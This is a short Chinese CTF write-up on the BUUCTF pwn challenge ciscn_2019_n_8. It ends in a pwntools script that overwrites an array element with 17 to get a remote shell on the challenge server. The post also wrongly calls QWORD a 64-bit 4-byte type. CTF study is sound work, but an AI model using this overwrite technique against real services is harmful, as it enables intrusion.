---
title: "BUUCTF Pwn Ciscn_2019_n_8"
date: 2020-02-13T11:53:07+08:00
author: NiceSeven
categories:
  - BUUCTF
tags:
  - Pwn
---

# ciscn_2019_n_8

checksec一下

![image-20200213115514266](/images/image-20200213115514266.png)

32位，防护基本上全开，不要吓到

拖入ida看一下伪代码

![image-20200213120226981](/images/image-20200213120226981.png)

可以看到满足var[13] = 17也就是数组中的第14个数为17，即执行shell

![image-20200213120449814](/images/image-20200213120449814.png)

![image-20200213122819593](/images/image-20200213122819593.png)



通过汇编知道var[]是一个四字节的整数类型数组，在ida中显示的数据类型DWORD与QWORD的区别不是很清楚

暂时理解DWORD为32位的4字节数组，QWORD理解为64位的4字节数组

exp

```python
#!/usr/bin/env python2
#-*-coding=UTF-8-*-

from pwn import *
context(log_level='debug')
sh = remote('node3.buuoj.cn',28862)
payload = 'a'*4*13 + p32(17) #p32(17)=\x11\x00\x00\x00,16进制小端存储，0x11(16)=17(10)
#这里*4是因为4字节的数组每一项要4字节才能填满，*13是把数组前13项填满，第14项用
sh.sendlineafter("What's your name?\n",payload)
sh.interactive()
```

![image-20200213123641425](/images/image-20200213123641425.png)

